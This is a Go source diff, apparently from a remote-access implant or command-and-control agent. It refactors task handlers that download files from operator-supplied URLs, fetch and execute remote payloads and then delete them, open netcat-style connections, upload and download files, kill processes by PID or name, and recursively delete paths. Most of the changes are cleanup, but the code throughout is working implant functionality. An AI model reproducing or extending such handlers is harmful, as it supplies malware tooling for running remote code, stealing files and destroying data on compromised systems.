@@ -62,9 +62,17 @@ var (
 var errInvalidOp = xerr.Sub("invalid operation", 0x68)
 
 type backer interface {
+	Grow(int) error
 	WriteUint32Pos(int, uint32) error
 }
 
+func waitThenDelete(e cmd.Runnable, p string) {
+	if bugtrack.Enabled {
+		defer bugtrack.Recover("task.waitThenDelete()")
+	}
+	e.Wait()
+	os.Remove(p)
+}
 func taskWait(x context.Context, r data.Reader, _ data.Writer) error {
 	d, err := r.Int64()
 	if err != nil {
@@ -86,6 +94,8 @@ func taskPull(x context.Context, r data.Reader, w data.Writer) error {
 		u, a, p string
 		err     = r.ReadString(&u)
 	)
+	// NOTE(dij): Do these escape?
+	//            Sometimes the compiler thinks so.
 	if err != nil {
 		return err
 	}
@@ -103,17 +113,28 @@ func taskPull(x context.Context, r data.Reader, w data.Writer) error {
 		o.Body.Close()
 		return xerr.Sub("invalid HTTP response", 0x67)
 	}
+	if len(p) == 0 { // If the destination path is zero, then redirect it to the Writer
+		w.WriteString("")
+		if w.WriteInt64(0); o.Request.ContentLength > 0 {
+			(w.(backer)).Grow(int(o.Request.ContentLength))
+			//  ^ This should NEVER panic!
+		}
+		_, err := io.Copy(w, o.Body)
+		o.Body.Close()
+		return err
+	}
 	var (
 		v = device.Expand(p)
 		f *os.File
 	)
 	// 0x242 - CREATE | TRUNCATE | RDWR
-	if f, err = os.OpenFile(v, 0x242, 0o755); err != nil {
+	if f, err = os.OpenFile(v, 0x242, 0755); err != nil {
 		o.Body.Close()
 		return err
 	}
-	n, err := f.ReadFrom(o.Body)
+	n, err := readFromFile(f, o.Body)
 	o.Body.Close()
+	f.Close()
 	w.WriteString(v)
 	w.WriteInt64(n)
 	return err
@@ -194,7 +215,7 @@ func taskNetcat(x context.Context, r data.Reader, w data.Writer) error {
 			return io.ErrShortWrite
 		}
 	}
-	if p&128 == 0 {
+	if p&0x80 == 0 {
 		f()
 		c.Close()
 		return nil
@@ -216,7 +237,7 @@ func taskUpload(x context.Context, r data.Reader, w data.Writer) error {
 		f *os.File
 	)
 	// 0x242 - CREATE | TRUNCATE | RDWR
-	if f, err = os.OpenFile(v, 0x242, 0o644); err != nil {
+	if f, err = os.OpenFile(v, 0x242, 0644); err != nil {
 		return err
 	}
 	n := data.NewCtxReader(x, r)
@@ -264,8 +285,11 @@ func taskDownload(x context.Context, r data.Reader, w data.Writer) error {
 		w.WriteInt64(0)
 		return nil
 	}
+	c := i.Size()
 	w.WriteBool(false)
-	w.WriteInt64(i.Size())
+	w.WriteInt64(c)
+	(w.(backer)).Grow(int(c))
+	//  ^ This should NEVER panic!
 	// 0 - READONLY
 	f, err := os.OpenFile(v, 0, 0)
 	if err != nil {
@@ -282,6 +306,8 @@ func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
 		z    bool
 		err  = r.ReadString(&u)
 	)
+	// NOTE(dij): Do these escape?
+	//            Sometimes the compiler thinks so.
 	if err != nil {
 		return err
 	}
@@ -300,6 +326,7 @@ func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
 		p string
 	)
 	if z {
+		w.WriteUint64(0) // Prime our buffer to handle the PID/ExitCode
 		e, p, err = man.WebExec(x, w, u, a)
 	} else {
 		e, p, err = man.WebExec(x, nil, u, a)
@@ -319,13 +346,7 @@ func taskPullExec(x context.Context, r data.Reader, w data.Writer) error {
 	}
 	if !z {
 		if w.WriteUint64(uint64(e.Pid()) << 32); len(p) > 0 {
-			go func() {
-				if bugtrack.Enabled {
-					defer bugtrack.Recover("task.taskPullExec.func1()")
-				}
-				e.Wait()
-				os.Remove(p)
-			}()
+			go waitThenDelete(e, p)
 		}
 		return nil
 	}
@@ -359,8 +380,8 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 	}
 	switch w.WriteUint8(t); t {
 	case taskIoKill:
-		var i uint32
-		if err = r.ReadUint32(&i); err != nil {
+		i, err := r.Uint32()
+		if err != nil {
 			return err
 		}
 		var p *os.Process
@@ -371,8 +392,8 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 		p.Release()
 		return err
 	case taskIoTouch:
-		var n string
-		if err = r.ReadString(&n); err != nil {
+		n, err := r.StringVal()
+		if err != nil {
 			return err
 		}
 		k := device.Expand(n)
@@ -380,21 +401,21 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 			return nil
 		}
 		// 0x242 - CREATE | TRUNCATE | RDWR
-		f, err1 := os.OpenFile(k, 0x242, 0o644)
+		f, err1 := os.OpenFile(k, 0x242, 0644)
 		if err1 != nil {
 			return err1
 		}
 		f.Close()
 		return nil
 	case taskIoDelete:
-		var n string
-		if err = r.ReadString(&n); err != nil {
+		n, err := r.StringVal()
+		if err != nil {
 			return err
 		}
 		return os.Remove(device.Expand(n))
 	case taskIoKillName:
-		var n string
-		if err = r.ReadString(&n); err != nil {
+		n, err := r.StringVal()
+		if err != nil {
 			return err
 		}
 		e, err1 := cmd.Processes()
@@ -417,13 +438,15 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 		e, p = nil, nil
 		return err
 	case taskIoDeleteAll:
-		var n string
-		if err = r.ReadString(&n); err != nil {
+		n, err := r.StringVal()
+		if err != nil {
 			return err
 		}
 		return os.RemoveAll(device.Expand(n))
 	case taskIoMove, taskIoCopy:
 		var n, d string
+		// NOTE(dij): Do these escape?
+		//            Sometimes the compiler thinks so.
 		if err = r.ReadString(&n); err != nil {
 			return err
 		}
@@ -440,7 +463,7 @@ func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
 			return err
 		}
 		// 0x242 - CREATE | TRUNCATE | RDWR
-		if f, err = os.OpenFile(u, 0x242, 0o644); err != nil {
+		if f, err = os.OpenFile(u, 0x242, 0644); err != nil {
 			s.Close()
 			return err
 		}
